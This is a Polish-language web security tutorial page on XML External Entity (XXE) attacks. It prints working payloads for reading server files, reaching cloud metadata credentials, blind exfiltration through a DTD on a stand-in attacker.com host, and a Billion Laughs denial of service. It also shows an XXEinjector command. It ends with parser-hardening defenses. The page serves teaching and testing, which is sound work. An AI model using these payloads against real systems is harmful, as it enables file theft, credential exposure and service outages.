---
id: "xxe"
title: "XML External Entity (XXE)"
sidebar_position: 15
---

# XML External Entity (XXE)

XXE to podatność występująca, gdy aplikacja parsuje dane XML dostarczone przez użytkownika, a parser ma włączoną obsługę **encji zewnętrznych (external entities)**. Pozwala to atakującemu odczytywać pliki serwera, przeprowadzać SSRF, eksfiltrować dane, a w niektórych przypadkach doprowadzić do RCE lub DoS.

---

##  Gdzie szukać XXE?

XXE pojawia się wszędzie, gdzie serwer przyjmuje XML:
- Klasyczne formularze i API z `Content-Type: application/xml` lub `text/xml`.
- Formaty oparte o XML: **SOAP, SAML, SVG, DOCX/XLSX (OOXML), RSS, XML-RPC**.
- Endpointy, które **na pierwszy rzut oka przyjmują JSON**, ale parser akceptuje też XML po zmianie `Content-Type`.

Test wstępny — podmień JSON na XML:
```http
POST /api/import HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<data><name>test</name></data>
```
Jeśli serwer poprawnie przetworzy XML — warto pogłębić test.

---

## Eksploatacja XXE

### **1️⃣ Odczyt plików lokalnych (File Disclosure)**
Klasyczny payload definiujący encję wskazującą na plik systemowy:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data><name>&xxe;</name></data>
```
Jeśli odpowiedź odbije zawartość `&xxe;` — w odpowiedzi zobaczysz `/etc/passwd`.

### **2️⃣ XXE → SSRF**
Encję można skierować na zasoby wewnętrzne lub metadane chmury (powiązanie z modułem SSRF):
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data><name>&xxe;</name></data>
```

### **3️⃣ Blind XXE (Out-of-Band)**
Gdy odpowiedź nie odbija danych, użyj zewnętrznego DTD i kanału OOB. Plik `evil.dtd` na serwerze atakującego:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```
Payload wysłany do aplikacji:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>
```
Dane wyciekną w logu HTTP na serwerze atakującego (np. nasłuch `python3 -m http.server`).

### **4️⃣ XXE przez plik SVG (upload)**
Jeśli aplikacja przyjmuje SVG (np. avatar), parser obrazu bywa podatny:
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

### **5️⃣ XXE w plikach OOXML (DOCX/XLSX)**
Pliki Office to archiwa ZIP z plikami XML. Rozpakuj, wstrzyknij payload do `word/document.xml` lub `[Content_Types].xml`, spakuj ponownie i prześlij do parsera dokumentów.

---

## 💣 Denial of Service – Billion Laughs

Atak wykładniczego rozwijania encji (entity expansion) potrafi wyczerpać pamięć serwera:
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>
```
> Testuj DoS wyłącznie w środowisku labowym lub za pisemną zgodą — może wyłączyć usługę.

---

##  Narzędzia

- **Burp Suite** – manualne testy i skaner aktywny (wykrywa XXE).
- **XXEinjector** – automatyzacja eksfiltracji plików:
```bash
git clone https://github.com/enjoiz/XXEinjector.git
ruby XXEinjector.rb --host=attacker.com --httpport=8080 --file=request.txt --path=/etc/passwd
```

---

##  Jak zabezpieczyć aplikację przed XXE?
✅ **Wyłącz obsługę DTD i encji zewnętrznych** w parserze XML (najskuteczniejsze).
✅ **Używaj bezpiecznej konfiguracji parsera** – np. w Javie `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.
✅ **Preferuj prostsze formaty** (JSON) tam, gdzie XML nie jest konieczny.
✅ **Waliduj i sanityzuj uploady** plików XML/SVG/OOXML.
✅ **Ogranicz uprawnienia procesu** parsującego i blokuj wychodzący ruch do zasobów wewnętrznych.

---

XXE to brama do odczytu plików, SSRF i eksfiltracji danych. Kolejnym krokiem będzie analiza podatności **File Upload i Web Shells**! 🚀
